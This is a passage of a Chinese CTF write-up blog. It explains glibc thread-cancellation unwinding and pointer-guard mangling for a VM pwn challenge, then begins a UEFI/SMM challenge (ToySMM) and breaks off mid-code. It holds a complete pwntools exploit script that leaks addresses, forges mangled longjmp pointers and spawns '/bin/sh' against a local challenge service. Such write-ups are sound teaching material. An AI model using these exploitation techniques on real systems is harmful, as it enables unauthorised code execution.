id="pthread-unwind"><a href="#pthread-unwind" class="headerlink" title="__pthread_unwind"></a>__pthread_unwind</h3><p>当一个函数拥有多个互斥锁却不幸被cancel时这个函数用于完成他的遗嘱doge</p><ul><li>初始化线程的exc的一些field</li><li>调用_Unwind_ForcedUnwind，参数是exc，unwind_stop函数和cleanup_jmp_buf</li></ul><h3 id="Unwind-ForcedUnwind"><a href="#Unwind-ForcedUnwind" class="headerlink" title="_Unwind_ForcedUnwind"></a>_Unwind_ForcedUnwind</h3><ul><li><p>调用__libc_unwind_link_get获取全局struct unwind_link global，里面的函数都是加密过的</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/global.png" class title="global"></li><li><p>获取当前线程的pointer_guard，解密ptr__Unwind_ForcedUnwind</p></li><li><p>调用ptr__Unwind_ForcedUnwind指向的函数，这个是libgcc_s.so.1中的_Unwind_ForcedUnwind函数</p></li></ul><h3 id="unwind-stop"><a href="#unwind-stop" class="headerlink" title="unwind_stop"></a>unwind_stop</h3><p>在libgcc中执行一些函数后又会回到glibc执行unwind_stop，参数stop_parameter为当前线程的cleanup_jmp_buf</p><ul><li>在start_thread创建新线程的时候会调用setjmp新建cleanup_jmp_buf，如果这个线程被取消，则调用longjmp返回start_thread进行收尾工作</li><li>unwind_stop会判断最后保存的上下文是不是正在展开的栈帧，是则调用longjmp，<strong>需要利用这一过程</strong></li></ul><h3 id="longjmp"><a href="#longjmp" class="headerlink" title="longjmp"></a>longjmp</h3><p>调用流程如下，这里的函数指针当然也是加密过的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">__libc_longjmp -&gt; __longjmp_cancel -&gt; *(cleanup_jmp_buf+<span class="hljs-number">0x38</span>)(cleanup_jmp_buf)<br>       rsp=*(cleanup_jmp_buf+<span class="hljs-number">0x30</span>)<br></code></pre></td></tr></table></figure><p><em>加密是循环<strong>左移0x11</strong>不是右移11^v^</em></p><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><p>用循环，只用dup发的数据太多read可能提前结束</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmnop</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x00&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmpop</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x01&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmadd</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x02&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmsub</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x03&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmmul</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x04&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmdiv</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x05&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmmod</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x06&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmand</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x07&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmor</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x08&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmxor</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x09&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmnot</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0a&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmcall</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-keyword">return</span> vmpush8(p64(addr))+<span class="hljs-string">b&#x27;\x0b&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmret</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-keyword">return</span> vmpush8(p64(addr))+<span class="hljs-string">b&#x27;\x0c&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmlea</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">return</span> vmpush8(p64(offset))+<span class="hljs-string">b&#x27;\x0d&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmpush1</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0e&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmpush2</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0f&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmpush4</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x10&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmpush8</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x11&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmoutput</span>(<span class="hljs-params">offset,cnt</span>):<br>    <span class="hljs-keyword">return</span> vmpush8(p64(cnt))+vmlea(offset)+vmpush8(p64(<span class="hljs-number">0x14242c101498d2fc</span>))+<span class="hljs-string">b&#x27;\x12&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vminput</span>(<span class="hljs-params">offset,cnt</span>):<br>    <span class="hljs-keyword">return</span> vmpush8(p64(cnt))+vmlea(offset)+vmpush8(p64(<span class="hljs-number">0xf06d7659e3c6851c</span>))+<span class="hljs-string">b&#x27;\x12&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmmodcall</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x12&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmjne</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x13&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmjl</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x14&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmjg</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x15&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmdup</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x16&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vmhlt</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x17&#x27;</span><br><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>shellcode=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>*<span class="hljs-number">3</span>)+p64(<span class="hljs-number">0x100</span>)+p64(<span class="hljs-number">0x14e</span>)+p64(<span class="hljs-number">0xfffffffffffe0000</span>)+p64(<span class="hljs-number">0x8d</span>)<br>pause()<br>p.sendafter(<span class="hljs-string">b&#x27;Start your exploit from here!&#x27;</span>,shellcode)<br>pause()<br><br>shellcode=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x98</span>+<span class="hljs-string">b&#x27;\x01\x0c&#x27;</span><br>shellcode=shellcode.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>shellcode+=vmlea(<span class="hljs-number">0</span>)+vmoutput(<span class="hljs-number">0x18</span>,<span class="hljs-number">8</span>)+vminput(<span class="hljs-number">0xfffffffffffe0200</span>,<span class="hljs-number">0x20000</span>-<span class="hljs-number">0x200</span>)+vmret(<span class="hljs-number">0x200</span>)<br><span class="hljs-comment"># overflow</span><br>p.send(shellcode)<br>vmstack=u64(p.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">0x820000</span><br>stack=vmstack+<span class="hljs-number">0x20000</span>+<span class="hljs-number">8</span><br>system_addr=vmstack+<span class="hljs-number">0x930000</span>+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(vmstack))<br><br>shellcode=vmpush8(p64(<span class="hljs-number">0</span>))+vmdup()+vmpush8(p64(<span class="hljs-number">1</span>))+vmadd()+vmdup()<br>shellcode+=vmpush8(p64((<span class="hljs-number">0x20000</span>-<span class="hljs-number">0x30</span>)//<span class="hljs-number">8</span>-<span class="hljs-number">4</span>))+vmsub()<br>shellcode+=vmpush8(p64(<span class="hljs-number">0x209</span>))+vmjg()<br>shellcode+=vmpush8(<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">8</span>)+vmdup()<br>shellcode+=vmpush4(<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">4</span>)+vmdup()+vmpush4(<span class="hljs-string">b&#x27;e&#x27;</span>*<span class="hljs-number">4</span>)<br>shellcode+=vmpush8(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>)+vmdup()*<span class="hljs-number">0xe6</span><br>shellcode+=vmpush8(p64(vmstack+<span class="hljs-number">0x840740</span>))+vmpush8(p64(vmstack+<span class="hljs-number">0x8410e0</span>))+vmpush8(p64(vmstack+<span class="hljs-number">0x840740</span>))<br>shellcode+=vmpush8(p64(<span class="hljs-number">1</span>))+vmpush8(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>)+vmdup()*(<span class="hljs-number">736</span>//<span class="hljs-number">8</span>-<span class="hljs-number">1</span>)<br>shellcode+=vmpush8(p64(vmstack+<span class="hljs-number">0x800400</span>))+vmpush4(p32(<span class="hljs-number">8</span>))+vmoutput(<span class="hljs-number">0x18</span>,<span class="hljs-number">8</span>)<br>shellcode=shellcode.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>shellcode+=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x28</span>+p64((stack&lt;&lt;<span class="hljs-number">0x11</span>)|((stack&gt;&gt;(<span class="hljs-number">64</span>-<span class="hljs-number">0x11</span>))&amp;<span class="hljs-number">0xffffffffffffffff</span>))<br>shellcode+=p64((system_addr&lt;&lt;<span class="hljs-number">0x11</span>)|((system_addr&gt;&gt;(<span class="hljs-number">64</span>-<span class="hljs-number">0x11</span>))&amp;<span class="hljs-number">0xffffffffffffffff</span>))<br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="ToySMM"><a href="#ToySMM" class="headerlink" title="ToySMM"></a>ToySMM</h1><p>\呆神&#x2F; \呆神&#x2F; \呆神&#x2F;</p><h2 id="先康康附件"><a href="#先康康附件" class="headerlink" title="先康康附件"></a>先康康附件</h2><p>尝试改变一下思维方式，不能什么都追溯到宇宙洪荒，效率低学习成本高容易劝退，说不定走一步看一步会有奇效：）</p><h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">! /bin/sh</span><br><br>cp OVMF_VARS.fd OVMF_VARS_copy.fd<br><br>./qemu-system-x86_64 \<br>  -no-reboot \<br>  -machine q35,smm=on \# 使用Intel Q35主板，开启SMM<br>  -cpu max \<br>  -net none \<br>  -serial stdio \# 串口输出重定向至标准输入输出<br>  -display none \<br>  -vga none \<br>  -global ICH9-LPC.disable_s3=1 \# 禁用ICH9-LPC设备的S3睡眠状态<br>  -global driver=cfi.pflash01,property=secure,value=on \<br><span class="hljs-meta prompt_">  # </span><span class="language-bash">启用QEMU内部的CFI（Common Flash Interface）模拟驱动，并设置其属性为secure</span><br>  -drive if=pflash,format=raw,unit=0,file=OVMF_CODE.fd,readonly=on \<br><span class="hljs-meta prompt_">  # </span><span class="language-bash">指定使用pflash驱动，并将OVMF_CODE.fd文件作为虚拟机的固件映像（Firmware Image），设置为只读</span><br>  -drive if=pflash,format=raw,unit=1,file=OVMF_VARS_copy.fd \<br><span class="hljs-meta prompt_">  # </span><span class="language-bash">指定使用pflash驱动，并将OVMF_VARS_copy.fd文件作为虚拟机的变量存储映像，用于保存虚拟机的变量状态</span><br>  -drive format=raw,file=fat:rw:rootfs\<br><span class="hljs-meta prompt_">  # </span><span class="language-bash">指定使用raw格式的驱动，并将rootfs文件作为虚拟机的硬盘驱动器</span><br>  -debugcon file:debug.log\# 将调试输出重定向到debug.log文件<br>  -global isa-debugcon.iobase=0x402# 设置调试串口的I/O基地址为0x402<br></code></pre></td></tr></table></figure><ul><li>CFI：一种用于模拟闪存设备的接口，CFI模拟驱动允许将虚拟机中的一块区域映射为可供虚拟机访问的闪存设备</li><li>-global：设置全局设备<ul><li>driver：设置了全局的driver pflash的配置，这里是secure on<ul><li>之后如果-driver选项通过if设置的接口类型为pflash则使用这个全局的配置</li></ul></li><li>pflash01：01表示设备的索引或编号</li></ul></li><li>OVMF_CODE.fd：<ul><li>if&#x3D;pflash：使用pflash接口</li><li>format&#x3D;raw：驱动器为原始格式</li><li>unit&#x3D;0：驱动器单元号为0</li><li>file&#x3D;OVMF_CODE.fd：指定驱动映像文件</li><li>readonly&#x3D;on：只读</li></ul></li><li>OVMF_VARS_copy.fd同上</li></ul><h3 id="kvmvapic-bin"><a href="#kvmvapic-bin" class="headerlink" title="kvmvapic.bin"></a>kvmvapic.bin</h3><p>qemu使用的BIOS ROM，因为不是本地的qemu所以需要这个文件</p><h3 id="OVMF"><a href="#OVMF" class="headerlink" title="OVMF"></a>OVMF</h3><p>部分内容来自2023HWS的ppt</p><ul><li>UEFI：一种标准，用来定义操作系统与系统固件之间的软件界面，作为BIOS的替代方案</li><li>EKD2：第二代UEFI的官方开发库，UEFI的一份实现代码</li><li>OVMF：一个固件，可以在虚拟机上运行的edk2包</li></ul><h3 id="rootfs"><a href="#rootfs" class="headerlink" title="rootfs"></a>rootfs</h3><p>rootfs作为硬盘驱动被载入</p><ul><li>startupn.nsh：UEFI shell的shell脚本</li><li>ToyApp.efi：UEFI模块</li></ul><h2 id="我是谁我在哪我要干什么"><a href="#我是谁我在哪我要干什么" class="headerlink" title="我是谁我在哪我要干什么"></a>我是谁我在哪我要干什么</h2><p>先捋一下题目干了什么我们要干什么</p><p>题目主要有两个部分</p><ul><li>ToySMM：一个SMM模块</li><li>ToyApp：一个efi模块</li></ul><h3 id="ToySMM-1"><a href="#ToySMM-1" class="headerlink" title="ToySMM"></a>ToySMM</h3><ul><li><p>这是一个SMM模块（工具：UEFITool）</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/toysmm.png" class title="toysmm"></li><li><p>模块入口函数ToySMM_entry_5DB9425E（工具：efiXplorer）</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/toyentry.png" class title="toyentry"><p>大概分为三部分：</p><ul><li><p>利用EFI_SMM_BASE2_PROTOCOL的GetSmstLocation服务获取EFI_SMM_SYSTEM_TABLE2</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/smmbase.png" class title="smmbase"><p>这个结构体主要提供一些服务（结构体部分成员如下）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EFI_SMM_SYSTEM_TABLE2</span> &#123;</span><br>  <span class="hljs-comment">/// 内存服务，申请或释放SMRAM</span><br>  EFI_ALLOCATE_POOL                       SmmAllocatePool;<br>  EFI_FREE_POOL                           SmmFreePool;<br>  EFI_ALLOCATE_PAGES                      SmmAllocatePages;<br>  EFI_FREE_PAGES                          SmmFreePages;<br><br>  <span class="hljs-comment">/// Protocol服务</span><br>  EFI_INSTALL_PROTOCOL_INTERFACE      SmmInstallProtocolInterface;<br>  EFI_UNINSTALL_PROTOCOL_INTERFACE    SmmUninstallProtocolInterface;<br>  EFI_HANDLE_PROTOCOL                 SmmHandleProtocol;<br>  EFI_SMM_REGISTER_PROTOCOL_NOTIFY    SmmRegisterProtocolNotify;<br>  EFI_LOCATE_HANDLE                   SmmLocateHandle;<br>  EFI_LOCATE_PROTOCOL                 SmmLocateProtocol;<br><br>  <span class="hljs-comment">/// SMI处理函数</span><br>  EFI_SMM_INTERRUPT_MANAGE            SmiManage;<br>  EFI_SMM_INTERRUPT_REGISTER          SmiHandlerRegister;<br>  EFI_SMM_INTERRUPT_UNREGISTER        SmiHandlerUnRegister;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>利用EFI_SMM_ACCESS2_PROTOCOL的GetCapabilities服务获取EFI_SMRAM_DESCRIPTOR</p><ul><li>先令GetCapabilities的SmramMap参数为0获取size</li><li>再申请内存</li><li>再通过GetCapabilities获取EFI_SMRAM_DESCRIPTOR</li><li>再通过size&gt;&gt;5获取EFI_SMRAM_DESCRIPTOR的个数（EFI_SMRAM_DESCRIPTOR32字节）</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  EFI_PHYSICAL_ADDRESS    PhysicalStart;<br>  EFI_PHYSICAL_ADDRESS    CpuStart;<br>  UINT64                  PhysicalSize;<br>  UINT64                  RegionState;<br>&#125; EFI_MMRAM_DESCRIPTOR;<br><br><span class="hljs-keyword">typedef</span> EFI_MMRAM_DESCRIPTOR EFI_SMRAM_DESCRIPTOR;<br></code></pre></td></tr></table></figure></li><li><p>然后是一些Hob操作，看不懂（</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/hob.png" class title="hob"></li><li><p>然后又是一些看不懂的操作…</p><ul><li>之后输出ToySMM模块的加载基址</li><li>利用SmiHandlerRegister注册SMM handler</li></ul><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/register.png" class title="register"></li></ul></li></ul><h3 id="ToyApp"><a href="#ToyApp" class="headerlink" title="ToyApp"></a>ToyApp</h3><p>从输出来判断一下这个app的功能：</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/app.png" class title="app"><ul><li>输入shellcode</li><li>输入Done执行shellcode</li><li>输入QUIT退出</li></ul><p>ToyApp.efi入口函数_ModuleEntryPoint执行的就是这个功能（反汇编完依托答辩）</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/shit.png" class title="shit"><p>动态加载地址可以搜索字符串确定（注意UTF-16LE）</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/run.png" class title="run"><h2 id="SMM"><a href="#SMM" class="headerlink" title="SMM"></a>SMM</h2><ul><li>SMM功能：<ul><li>提供一块隔离内存SMRAM，包含代码和数据</li><li>只有SMM（ring -2）可以访问</li></ul></li><li>进入SMM：<ul><li>发出SMI，向0xB2端口写入数据就可以触发SMI</li></ul></li></ul><h3 id="SmiHandlerRegister"><a href="#SmiHandlerRegister" class="headerlink" title="SmiHandlerRegister"></a>SmiHandlerRegister</h3><p>看一下SmiHandlerRegister的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c">EFI_STATUS<br>EFIAPI<br><span class="hljs-title function_">SmiHandlerRegister</span> <span class="hljs-params">(</span><br><span class="hljs-params">  IN  EFI_SMM_HANDLER_ENTRY_POINT2  Handler,</span><br><span class="hljs-params">  IN  CONST EFI_GUID                *HandlerType  OPTIONAL,</span><br><span class="hljs-params">  OUT EFI_HANDLE                    *DispatchHandle</span><br><span class="hljs-params">  )</span><br>&#123;<br>  SMI_HANDLER  *SmiHandler;<br>  SMI_ENTRY    *SmiEntry;<br>  LIST_ENTRY   *List;<br><br>    <span class="hljs-comment">// 1. 新建一个SMI_HANDLER</span><br>  <span class="hljs-keyword">if</span> ((Handler == <span class="hljs-literal">NULL</span>) || (DispatchHandle == <span class="hljs-literal">NULL</span>)) &#123;<br>    <span class="hljs-keyword">return</span> EFI_INVALID_PARAMETER;<br>  &#125;<br><br>  SmiHandler = AllocateZeroPool (<span class="hljs-keyword">sizeof</span> (SMI_HANDLER));<br>  <span class="hljs-keyword">if</span> (SmiHandler == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-keyword">return</span> EFI_OUT_OF_RESOURCES;<br>  &#125;<br><br>  SmiHandler-&gt;Signature  = SMI_HANDLER_SIGNATURE;<br>  SmiHandler-&gt;Handler    = Handler;<br>  SmiHandler-&gt;CallerAddr = (UINTN)RETURN_ADDRESS (<span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 2. 利用SmmCoreFindSmiEntry将SmiHandler插入mSmiEntryList</span><br>  <span class="hljs-keyword">if</span> (HandlerType == <span class="hljs-literal">NULL</span>) &#123;<br>    SmiEntry = &amp;mRootSmiEntry;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    SmiEntry = SmmCoreFindSmiEntry ((EFI_GUID *)HandlerType, TRUE);<br>    <span class="hljs-keyword">if</span> (SmiEntry == <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-keyword">return</span> EFI_OUT_OF_RESOURCES;<br>    &#125;<br>  &#125;<br><br>  List = &amp;SmiEntry-&gt;SmiHandlers;<br><br>  SmiHandler-&gt;SmiEntry = SmiEntry;<br>  InsertTailList (List, &amp;SmiHandler-&gt;Link);<br><br>    <span class="hljs-comment">// 3. 返回SmiHandler</span><br>  *DispatchHandle = (EFI_HANDLE)SmiHandler;<br><br>  <span class="hljs-keyword">return</span> EFI_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure><p>SMI_HANDLER结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SMI_HANDLER_SIGNATURE  SIGNATURE_32(<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>)</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  UINTN                           Signature;<br>  LIST_ENTRY                      Link;       <span class="hljs-comment">// Link on SMI_ENTRY.SmiHandlers</span><br>  EFI_SMM_HANDLER_ENTRY_POINT2    Handler;    <span class="hljs-comment">// The smm handler&#x27;s entry point</span><br>  UINTN                           CallerAddr; <span class="hljs-comment">// The address of caller who register the SMI handler.</span><br>  SMI_ENTRY                       *SmiEntry;<br>  VOID                            *Context;    <span class="hljs-comment">// for profile</span><br>  UINTN                           ContextSize; <span class="hljs-comment">// for profile</span><br>&#125; SMI_HANDLER;<br></code></pre></td></tr></table></figure><p>这里的EFI_SMM_HANDLER_ENTRY_POINT2是个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span><br><span class="hljs-title function_">EFI_STATUS</span><br><span class="hljs-params">(EFIAPI *EFI_MM_HANDLER_ENTRY_POINT)</span><span class="hljs-params">(</span><br><span class="hljs-params">  IN EFI_HANDLE  DispatchHandle,</span><br><span class="hljs-params">  IN CONST VOID  *Context         OPTIONAL,</span><br><span class="hljs-params">  IN OUT VOID    *CommBuffer      OPTIONAL,</span><br><span class="hljs-params">  IN OUT UINTN   *CommBufferSize  